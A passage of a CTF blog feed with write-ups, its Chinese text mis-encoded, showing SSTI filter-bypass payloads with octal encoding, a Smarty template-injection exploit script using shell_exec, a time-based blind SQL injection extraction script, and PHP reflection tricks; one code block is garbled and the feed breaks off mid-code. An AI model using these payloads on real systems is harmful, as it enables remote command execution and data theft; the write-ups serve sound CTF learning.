    <content type="html"><![CDATA[<h2 id="remote-table"><a href="#remote-table" class="headerlink" title="remote_table"></a>remote_table</h2><p>æ‰“å¼€ç¯å¢ƒ    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/b36aac21b99441e6.png"></p><p>å°±åœ¨è¿™é‡Œï¼Œæˆ‘å±…ç„¶æ²¡æ‰¾åˆ°ï¼Œå¤ªå¤±è´¥äº†   </p><h2 id="The-myth-of-Aladdin"><a href="#The-myth-of-Aladdin" class="headerlink" title="The_myth_of_Aladdin"></a>The_myth_of_Aladdin</h2><p>SSTI<br>è¿‡æ»¤äº†<code>&#123;&#123;&#125;&#125;</code>ç”¨<code>&#123;%print()%&#125;</code>æ›¿ä»£<br><code>.</code>ç”¨<code>[]</code>æ›¿æ¢<br>è¿‡æ»¤äº†ç±»åï¼Œå…«è¿›åˆ¶æˆ–è€…Unicodeå‡å¯ç»•è¿‡     </p><p>payloadï¼š<code>&#123;%print(().__class__.__base__.__subclass__()[95].__init__.__globals__.__builtins__.__import__('os').popen('ls').read())%&#125;</code>   </p><p>è½¬å…«è¿›åˆ¶     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$str=<span class="hljs-string">&#x27;read&#x27;</span>;$res=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($str);$i++)&#123;    $res.=<span class="hljs-string">&quot;\\&quot;</span>.decoct(ord($str[$i]));&#125;<span class="hljs-keyword">echo</span> $str.<span class="hljs-string">&quot;\n&quot;</span>;var_dump($res);</code></pre></code></pre><p>en-payload:<code>&#123;%print(()["\137\137\143\154\141\163\163\137\137"]["\137\137\142\141\163\145\137\137"]["\137\137\163\165\142\143\154\141\163\163\145\163\137\137"]()[95]["\137\137\151\156\151\164\137\137"]["\137\137\147\154\157\142\141\154\163\137\137"]["\137\137\142\165\151\154\164\151\156\163\137\137"]["\137\137\151\155\160\157\162\164\137\137"]("o""s")["\160\157\160\145\156"]("ls")["\162\145\141\144"]())%&#125;</code>     </p><p>ç©ºæ ¼ç”¨<code>%09</code>ä»£æ›¿     </p><p>æœ€åè¯»å–flagè¿‡æ»¤äº†<code>Neepu</code>ï¼ŒUnicodeç¼–ç <br><code>cat /flag|base64</code>â€”&gt;<code>\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067\u007c\u0062\u0061\u0073\u0065\u0036\u0034</code>     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/36675dab86b84736.png">    </p><p>WPæ˜¯ä½¿ç”¨æˆªæ–­çš„æ–¹æ³•è¯»å–flagçš„<br><code>&quot;c&quot;&quot;ut%09-c%092-40%09/fl&quot;&quot;ag&quot;</code><br>cut<br> <code>-c</code>:ä»…æ˜¾ç¤ºè¡Œä¸­æŒ‡å®šèŒƒå›´çš„å­—ç¬¦ï¼›     </p><h2 id="gamebox"><a href="#gamebox" class="headerlink" title="gamebox"></a>gamebox</h2><p>æ‰“å¼€ç¯å¢ƒæ˜¯ä¸ªç™»å½•æ¡†ï¼Œä¸‡èƒ½å¯†ç å³å¯ç™»å½•<code>adwa&#39;=&#39;0</code><br>è¿›å…¥åæ˜¯ä¸ªå°æ¸¸æˆ<br><img src="https://ftp.bmp.ovh/imgs/2021/05/00e8b9a1dd156058.png">     </p><p>éªŒè¯ç å›¾ç‰‡çš„åå­—å°±æ˜¯éªŒè¯ç ï¼Œå¯ä»¥å†™è„šæœ¬è·‘    </p><p>çŒœå¯¹äº”æ¬¡åä¼šè¿›è¡Œè·³è½¬<br><code>http://neepusec.club:18943/index.php?file=rander.php</code>       </p><p>å¯ä»¥ç”¨ä¸ºåè®®è¯»å–ä¸‹æºç <br><code>?file=php://filter/read=convert.base64-encode/resource=rander.php</code>     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// create object</span><span class="hljs-keyword">if</span> ($_SESSION[<span class="hljs-string">&#x27;num&#x27;</span>] &gt;= <span class="hljs-number">5</span>) &#123;    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;smarty/Smarty.class.php&#x27;</span>);    $smarty = <span class="hljs-keyword">new</span> Smarty;    $name = $_SESSION[<span class="hljs-string">&quot;username&quot;</span>];    $smarty-&gt;display(<span class="hljs-string">&#x27;string:æ­å–œ &#x27;</span>.$name.<span class="hljs-string">&#x27; è·å¾—äº†èƒœåˆ©&#x27;</span>);&#125;</code></pre></code></pre><p><code>display</code>å­˜åœ¨PHPæ¨¡æ¿æ³¨å…¥     </p><p>åå­—æ”¹æˆæ¨¡æ¿æ³¨å…¥è¯­å¥å³å¯<br>è¿™é‡Œè¿˜æœ‰<code>disable_function</code>,å¯ä»¥ç”¨<code>shell_exec</code>    </p><p>WPçš„EXPï¼š        </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> requestsurl=<span class="hljs-string">&quot;http://neepusec.club:18943&quot;</span>s = requests.Session()<span class="hljs-comment">#payload = &quot;&#123;&#123;shell_exec(\&quot;\ls\t/\&quot;)&#125;&#125;&#x27;=&#x27;0&quot;</span>payload = <span class="hljs-string">&quot;&#123;&#123;shell_exec(\&quot;cat\t/This_is_your_Flag\&quot;)&#125;&#125;&#x27;=&#x27;0&quot;</span>login_data = &#123;<span class="hljs-string">&quot;username&quot;</span>:payload&#125;res0 = s.post(url+<span class="hljs-string">&quot;/login.php&quot;</span>,data = login_data)res1 = s.get(url+<span class="hljs-string">&quot;/index.php&quot;</span>)reg = re.findall(<span class="hljs-string">&#x27;pic\/.*?\.jpg&#x27;</span>,res1.text)data=&#123;<span class="hljs-string">&quot;authcode&quot;</span>:reg[<span class="hljs-number">0</span>][<span class="hljs-number">4</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&quot;guess&quot;</span>:<span class="hljs-string">&quot;on&quot;</span>&#125;<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1000</span>):    res3 = s.post(url+<span class="hljs-string">&quot;/index.php&quot;</span>,data=data)    reg = re.findall(<span class="hljs-string">&#x27;pic\/.*?\.jpg&#x27;</span>,res3.text)    data=&#123;<span class="hljs-string">&quot;authcode&quot;</span>:reg[<span class="hljs-number">0</span>][<span class="hljs-number">4</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&quot;guess&quot;</span>:<span class="hljs-string">&quot;on&quot;</span>&#125;    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(res3.text)!=<span class="hljs-number">3287</span>):        print(i)        print(res3.text)        <span class="hljs-keyword">break</span></code></pre></code></pre><p>å¦ä¸€ç§æ–¹æ³•<a href="https://www.cnblogs.com/erR0Ratao/p/14806464.html">ï¼ˆæ—¥å¿—åŒ…å«ï¼‰</a>ï¼š<br>æ—¥å¿—è·¯å¾„<code>file=/var/log/nginx/access.log</code><br><img src="https://ftp.bmp.ovh/imgs/2021/05/4ad56cf981691d27.png">       </p><p>å†™å…¥ä¸€å¥è¯<br><img src="https://ftp.bmp.ovh/imgs/2021/05/81e22ec2143d5c2f.png"></p><p><a href="https://www.cnblogs.com/erR0Ratao/p/14806464.html">more</a>     </p><p><a href="https://www.cnblogs.com/my1e3/p/5854897.html">æ—¥å¿—åŒ…å«</a>     </p><hr><p><a href="https://www.anquanke.com/post/id/242237#h3-2">æœ€åä¸¤é¢˜</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;remote-table&quot;&gt;&lt;a href=&quot;#remote-table&quot; class=&quot;headerlink&quot; title=&quot;remote_table&quot;&gt;&lt;/a&gt;remote_table&lt;/h2&gt;&lt;p&gt;æ‰“å¼€ç¯å¢ƒ    &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
    <category term="upload" scheme="http://lll-nnn.github.io/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>MTCTF CSICN</title>
    <link href="http://lll-nnn.github.io/2021/05/25/MTCISCN/"/>
    <id>http://lll-nnn.github.io/2021/05/25/MTCISCN/</id>
    <published>2021-05-25T06:48:38.000Z</published>
    <updated>2021-05-25T09:04:27.193Z</updated>
    
    <content type="html"><![CDATA[<h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>MTçš„ç¬¬ä¸€é¢˜ï¼Œæ—¶é—´ç›²æ³¨ï¼Œä½†æ˜¯å¸¸è§çš„å­—ç¬¦éƒ½è¿‡äº†<code>ascii</code>ã€<code>substr</code>,å¤§äºå·å°äºå·ç­‰äºå·ï¼Œ<code>lile</code>,<code>if</code>éƒ½è¿‡äº†ï¼Œä¸ä¼šäº†   </p><p><code>W&amp;M</code> çš„WP   </p><pre><code><pre><code class="hljs python">    <span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> req    <span class="hljs-keyword">import</span> time    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ord2hex</span>(<span class="hljs-params">string</span>):</span>    result = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string:        result += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))    result = result.replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0x&#x27;</span>+result    url = <span class="hljs-string">&quot;http://eci-2ze7bgvjvxtgmki6mtcj.cloudeci1.ichunqiu.com/index.php&quot;</span>    string = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>]    headers = &#123;        <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0&#x27;</span>,        <span class="hljs-string">&#x27;Accept&#x27;</span>:<span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,        <span class="hljs-string">&#x27;Connection&#x27;</span>:<span class="hljs-string">&#x27;keep-alive&#x27;</span>        &#125;    res = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> string:        passwd = ord2hex(<span class="hljs-string">&#x27;^&#x27;</span>+res+<span class="hljs-built_in">chr</span>(j))        <span class="hljs-comment">#print(passwd)</span>        passwd = <span class="hljs-string">&#x27;||case/**/when/**/password/**/regexp/**/binary/**/&#123;&#125;/**/then/**/sleep(3)/**/else/**/1111111/**/end/**/#&#x27;</span>.<span class="hljs-built_in">format</span>(passwd)        <span class="hljs-comment">#print(passwd)</span>        data = &#123;        <span class="hljs-string">&#x27;username&#x27;</span>:<span class="hljs-string">&quot;admin\\&quot;</span>,        <span class="hljs-string">&#x27;password&#x27;</span>:passwd        &#125;        before_time = time.time()        r = req.post(url, data=data, headers=headers)        after_time = time.time()        <span class="hljs-comment">#print( r.text)</span>        offset = after_time - before_time        <span class="hljs-comment"># print(offset)</span>        <span class="hljs-keyword">if</span> (offset &gt; <span class="hljs-number">2</span>):        print(passwd)        res += <span class="hljs-built_in">chr</span>(j)        print(res)        <span class="hljs-keyword">break</span>    <span class="hljs-comment">#password This_1s_thE_Passw0rd</span>    ```    `case when`  ![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">05</span>/<span class="hljs-number">27e74714170</span>e20bb.png)    `regexp`æ­£åˆ™åŒ¹é…     è¿™ä¸ªåŒ¹é…å¯ä»¥ç›´æ¥åŒ¹é…åˆ°å­—ç¬¦çš„åå…­è¿›åˆ¶ï¼ŒMysqlä¼šå°†åå…­è¿›åˆ¶è½¬æ¢      ![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">05</span>/<span class="hljs-number">69215</span>b03e678fd6b.png)        <span class="hljs-comment">## easytricks </span>MT      ä¹Ÿæœ‰SQLæ³¨å…¥çš„ç‚¹   ` select * <span class="hljs-keyword">from</span> user where user=<span class="hljs-string">&#x27;$user&#x27;</span> <span class="hljs-keyword">and</span> passwd=<span class="hljs-string">&#x27;%s&#x27;</span>`    %s----&gt;å­—ç¬¦ä¸²      [sprintfæ ¼å¼åŒ–æ³¨å…¥æ¼æ´](https://blog.csdn.net/weixin_41185953/article/details/<span class="hljs-number">80485075</span>)     `æ²¡åšå­—ç¬¦ç±»å‹æ£€æµ‹çš„æœ€å¤§å±å®³å°±æ˜¯å®ƒå¯ä»¥åƒæ‰ä¸€ä¸ªè½¬ä¹‰ç¬¦\, å¦‚æœ%åé¢å‡ºç°ä¸€ä¸ª\,é‚£ä¹ˆphpä¼šæŠŠ\å½“ä½œä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦çš„ç±»å‹è€Œåƒæ‰\, æœ€å%\ï¼ˆæˆ–%<span class="hljs-number">1</span>$\ï¼‰è¢«æ›¿æ¢ä¸ºç©º`  ![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">05</span>/<span class="hljs-number">7</span>b7afea854b5deba.png)     å¯ä»¥çœ‹åˆ°`%<span class="hljs-number">1</span>$`åçš„`<span class="hljs-string">&#x27;`è¢«åäº†      </span><span class="hljs-string"></span><span class="hljs-string">[MTCTF-2021 Write_Up by æ‰“CTFä¸é å®åŠ›é è¿æ°”](https://mp.weixin.qq.com/s/zP7pOdL0zbWzKMJlVcff-Q)     </span><span class="hljs-string"></span><span class="hljs-string"></span><span class="hljs-string">##  easy_source   </span><span class="hljs-string">CISCN   </span><span class="hljs-string"></span><span class="hljs-string"></span><span class="hljs-string">`.index.php.swo`    </span><span class="hljs-string"></span><span class="hljs-string">    ```php</span><span class="hljs-string">    &lt;?php</span><span class="hljs-string">    class User</span><span class="hljs-string">    &#123;</span><span class="hljs-string">        private static $c = 0;</span><span class="hljs-string"></span><span class="hljs-string">        function a()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function b()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function c()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function d()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function e()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function f()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function g()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function h()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function i()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function j()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function k()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function l()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function m()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function n()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function o()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function p()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function q()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function r()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function s()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function t()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string">        </span><span class="hljs-string">    &#125;</span><span class="hljs-string"></span><span class="hljs-string">    $rc=$_GET[&quot;rc&quot;];</span><span class="hljs-string">    $rb=$_GET[&quot;rb&quot;];</span><span class="hljs-string">    $ra=$_GET[&quot;ra&quot;];</span><span class="hljs-string">    $rd=$_GET[&quot;rd&quot;];</span><span class="hljs-string">    $method= new $rc($ra, $rb);</span><span class="hljs-string">    var_dump($method-&gt;$rd());</span></code></pre></code></pre><p>åˆ©ç”¨PHPåŸç”Ÿç±»è¯»å–ç±»ä¸­çš„æ³¨é‡Š<br><code>ReflectionMethod</code>  </p><p><code>public ReflectionMethod::__construct ( mixed $class , string $name )</code><br>â€“&gt;$classç±»çš„åç§°      </p><p>â€“&gt;$nameæ–¹æ³•çš„åç§°         </p><p>æˆ–è€…<code>public ReflectionMethod::__construct ( string $class_method )</code>      </p><p>$class_methodâ€“&gt;ç±»çš„åç§°å’Œæ–¹æ³•çš„åç§°ä¸­é—´ä»¥<code>::</code>åˆ†å‰²      </p><p>ReflectionMethodä¸­çš„<code>getDocComment</code>å¯ä»¥è¿”å›æ³¨é‡Š ä»£ç      </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/e78bf4d72e174c59.png">     </p><p>payload:<code>rc=ReflectionMethond&amp;ra=User&amp;rb=q&amp;rd=getDocComment</code>      </p><p>ReflectionMethodé‡Œçš„å…¶ä»–æ–¹æ³•    </p><pre><code>```php$ref = new ReflectionClass(B::class);//print_r(ReflectionClass::export(demo::class));print_r($ref-&gt;getProperties()); // è·å–ä¸€çº§å±æ€§, å¯ä»¥ä¼ å‚æ•°è¿‡æ»¤, è¿”å›ReflectionProperty å¯¹è±¡çš„æ•°ç»„ã€‚var_dump($ref-&gt;getConstructor()); // è·å–æ„é€ å‡½æ•°, æœªå®šä¹‰è¿”å›nullvar_dump($ref-&gt;inNamespace()); // æ˜¯å¦åœ¨å‘½åç©ºé—´ä¸­var_dump($ref-&gt;getConstants()); // è·å–æ‰€æœ‰å®šä¹‰çš„å¸¸é‡var_dump($ref-&gt;getConstant(&#39;TEST_1&#39;)); // è·å–æŸä¸ªå¸¸é‡print_r($ref-&gt;getDefaultProperties()); // è·å–é»˜è®¤å±æ€§, è¿”å›æ•°ç»„, åŒ…æ‹¬çˆ¶ç±»çš„å±æ€§var_dump($ref-&gt;getDocComment()); // è·å–ç±»æ–‡æ¡£æ³¨é‡Š, ä¸åŒ…å«å±æ€§å’Œæ–¹æ³•çš„æ³¨é‡Š, æ— æ³¨é‡Šè¿”å›falsevar_dump($ref-&gt;getExtension()); // è·å–è·å–æœ€åä¸€è¡Œçš„è¡Œæ•°var_dump($ref-&gt;getFileName()); // è·å–å®šä¹‰ç±»çš„æ–‡ä»¶å, è¿”å›ç»å¯¹è·¯å¾„var_dump($ref-&gt;getInterfaceNames()); // è·å–æ¥å£åç§°, è¿”å›ç´¢å¼•æ•°ç»„,å€¼ä¸ºæ¥å£åç§°, æœªå®ç°æ¥å£è¿”å›ç©ºæ•°ç»„var_dump($ref-&gt;getInterfaces()); // è·å–æ¥å£, è¿”å›å…³è”æ•°ç»„, name=&gt;ReflectionClasså®ä¾‹, æœªå®ç°æ¥å£è¿”å›ç©ºæ•°ç»„var_dump($ref-&gt;getMethods()); // æŒ‡è·å–ç±»æ–¹æ³• ReflectionMethodã€‚var_dump($ref-&gt;getMethod(&#39;foo4&#39;)); // è·å–ä¸€ä¸ªç±»æ–¹æ³•çš„ ReflectionMethodã€‚å¦‚æœæ–¹æ³•ä¸å­˜åœ¨ä¼šæŠ›å‡ºå¼‚å¸¸, éœ€è¦é…åˆtry catchä¸€èµ·ç”¨var_dump($ref-&gt;getName()); // è·å–ç±»å, åŒ…å«å‘½åç©ºé—´var_dump($ref-&gt;getNamespaceName()); // è·å–å‘½åç©ºé—´çš„åç§°, æ²¡æœ‰è¿”å›ç©ºvar_dump($ref-&gt;getParentClass()); // è·å–çˆ¶ç±»reflectionClassçš„å®ä¾‹, æ²¡æœ‰çˆ¶ç±»è¿”å›falsevar_dump($ref-&gt;getProperty(&#39;prop3&#39;)); // è·å–ä¸€ä¸ªå±æ€§, è¿”å›ReflectionPropertyå®ä¾‹, å±æ€§ä¸å­˜åœ¨ä¼šæŠ›å‡ºå¼‚å¸¸, éœ€é…åˆtry catchä½¿ç”¨var_dump($ref-&gt;getShortName()); // è·å–ç±»å, ä¸åŒ…å«å‘½åç©ºé—´var_dump($ref-&gt;getStartLine()); // è·å–èµ·å§‹è¡Œå·print_r($ref-&gt;getStaticProperties()); // è·å–é™æ€å±æ€§print_r($ref-&gt;getStaticPropertyValue(&#39;prop_static&#39;)); // è·å–é™æ€å±æ€§å€¼, æœªå®šä¹‰çš„å±æ€§ä¼šæŠ¥è‡´å‘½é”™è¯¯print_r($ref-&gt;getTraitAliases()); // è¿”å› trait åˆ«åçš„ä¸€ä¸ªæ•°ç»„print_r($ref-&gt;getTraitNames()); // è¿”å› trait åˆ«åçš„ä¸€ä¸ªæ•°ç»„print_r($ref-&gt;getTraits()); // è¿”å›è¿™ä¸ªç±»æ‰€ä½¿ç”¨çš„ traits æ•°ç»„var_dump($ref-&gt;hasConstant(&#39;AB&#39;)); // æ£€æŸ¥å¸¸é‡æ˜¯å¦å·²ç»å®šä¹‰var_dump($ref-&gt;hasMethod(&#39;AB&#39;)); // æ£€æŸ¥æ–¹æ³•æ˜¯å¦å·²ç»å®šä¹‰var_dump($ref-&gt;hasProperty(&#39;AB&#39;)); // æ£€æŸ¥å±æ€§æ˜¯å¦å·²å®šä¹‰var_dump($ref-&gt;implementsInterface(&#39;reflection\Abc&#39;)); // æ£€æŸ¥æ˜¯å¦å®ç°äº†æŸä¸ªæ¥å£, æ³¨æ„éœ€è¦å¸¦ä¸Šå‘½åç©ºé—´var_dump($ref-&gt;isAbstract()); // æ£€æŸ¥ç±»æ˜¯å¦æ˜¯æŠ½è±¡ç±»ï¼ˆabstractï¼‰var_dump($ref-&gt;isAnonymous()); // æ£€æŸ¥ç±»æ˜¯å¦æ˜¯åŒ¿åç±»var_dump($ref-&gt;isCloneable()); // è¿”å›äº†ä¸€ä¸ªç±»æ˜¯å¦å¯å¤åˆ¶var_dump($ref-&gt;isFinal()); // æ£€æŸ¥ç±»æ˜¯å¦å£°æ˜ä¸º finalvar_dump($ref-&gt;isInstance($obj)); // æ£€æŸ¥ä¸€ä¸ªå˜é‡æ˜¯å¦æ­¤ç±»çš„å®ä¾‹var_dump($ref-&gt;isInstantiable()); // æ£€æŸ¥ç±»æ˜¯å¦å¯å®ä¾‹åŒ–var_dump($ref-&gt;isInterface()); // æ£€æŸ¥ç±»æ˜¯å¦æ˜¯ä¸€ä¸ªæ¥å£ï¼ˆinterfaceï¼‰var_dump($ref-&gt;isInternal()); // æ£€æŸ¥ç±»æ˜¯å¦ç”±æ‰©å±•æˆ–æ ¸å¿ƒåœ¨å†…éƒ¨å®šä¹‰, å’ŒisUserDefinedç›¸å¯¹var_dump($ref-&gt;isIterateable()); // æ£€æŸ¥æ­¤ç±»æ˜¯å¦å¯è¿­ä»£, å®ç°äº†Iteratoræ¥å£å³å¯è¿­ä»£var_dump($ref-&gt;isSubclassOf(A::class)); // æ˜¯å¦æ˜¯æŸä¸€ä¸ªç±»çš„å­ç±»var_dump($ref-&gt;isTrait()); // è¿”å›äº†æ˜¯å¦ä¸ºä¸€ä¸ª traitvar_dump($ref-&gt;isUserDefined()); // æ£€æŸ¥æ˜¯å¦ç”±ç”¨æˆ·å®šä¹‰çš„ç±» å’ŒisInternalç›¸å¯¹// ä»æŒ‡å®šçš„å‚æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»å®ä¾‹,åˆ›å»ºç±»çš„æ–°çš„å®ä¾‹ã€‚ç»™å‡ºçš„å‚æ•°å°†ä¼šä¼ é€’åˆ°ç±»çš„æ„é€ å‡½æ•°ã€‚// æ¥å—å¯å˜æ•°ç›®çš„å‚æ•°ï¼Œç”¨äºä¼ é€’åˆ°ç±»çš„æ„é€ å‡½æ•°ï¼Œå’Œ call_user_func() å¾ˆç›¸ä¼¼ã€‚var_dump($ref-&gt;newInstance());// ä»æŒ‡å®šçš„å‚æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»å®ä¾‹,åˆ›å»ºç±»çš„æ–°çš„å®ä¾‹ã€‚ç»™å‡ºçš„å‚æ•°å°†ä¼šä¼ é€’åˆ°ç±»çš„æ„é€ å‡½æ•°ã€‚//è¿™ä¸ªå‚æ•°ä»¥ array å½¢å¼ä¼ é€’åˆ°ç±»çš„æ„é€ å‡½æ•°ã€‚var_dump($ref-&gt;newInstanceArgs([]));var_dump($ref-&gt;newInstanceWithoutConstructor()); // åˆ›å»ºä¸€ä¸ªæ–°çš„å®ä¾‹è€Œä¸è°ƒç”¨ä»–çš„æ„é€ å‡½æ•°$ref-&gt;setStaticPropertyValue (&#39;prop_static&#39;, &#39;222&#39;); // è®¾ç½®é™æ€å±æ€§çš„å€¼, æ— è¿”å›å€¼var_dump($ref-&gt;__toString ()); // è¿”å› ReflectionClass å¯¹è±¡å­—ç¬¦ä¸²çš„è¡¨ç¤ºå½¢å¼ã€‚â€‹```</code></pre><p><a href="http://www.xl-bit.cn/index.php/archives/434/">Bitâ€™s Blog â€”-CISCN2021â€”åˆèµ›â€”WPï¼ˆåŠéƒ¨åˆ†è§£é¢˜æ€è·¯ï¼‰</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;sql&quot;&gt;&lt;a href=&quot;#sql&quot; class=&quot;headerlink&quot; title=&quot;sql&quot;&gt;&lt;/a&gt;sql&lt;/h2&gt;&lt;p&gt;MTçš„ç¬¬ä¸€é¢˜ï¼Œæ—¶é—´ç›²æ³¨ï¼Œä½†æ˜¯å¸¸è§çš„å­—ç¬¦éƒ½è¿‡äº†&lt;code&gt;ascii&lt;/code&gt;ã€&lt;code&gt;substr&lt;/code&gt;,å¤§äºå·å°äº</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="sql" scheme="http://lll-nnn.github.io/categories/CTF/sql/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="sql" scheme="http://lll-nnn.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>Avatar Uploader 1</title>
    <link href="http://lll-nnn.github.io/2021/05/24/BUU88/"/>
    <id>http://lll-nnn.github.io/2021/05/24/BUU88/</id>
    <published>2021-05-24T14:43:09.000Z</published>
    <updated>2021-05-24T15:03:50.273Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>æ‰“å¼€ç¯å¢ƒ  </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/ec5696d2927c25ee.png"><br>å…ˆéšä¾¿è¾“ä¸ªè¿›å»çœ‹çœ‹<br><img src="https://ftp.bmp.ovh/imgs/2021/05/5c988c69bedf52e1.png">     </p><p>æ–‡ä»¶ä¸Šä¼    </p><p>å°è¯•äº†å‡ ä¸‹ï¼Œæ„Ÿè§‰æ²¡æˆï¼Œåªè®©ä¸Šä¼ PNG    </p><p>çœ‹ä¸‹WP<br>ç»™äº†æºç     </p><p><code>upload.php</code>    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/util.php&#x27;</span>);<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/session.php&#x27;</span>);$session = <span class="hljs-keyword">new</span> 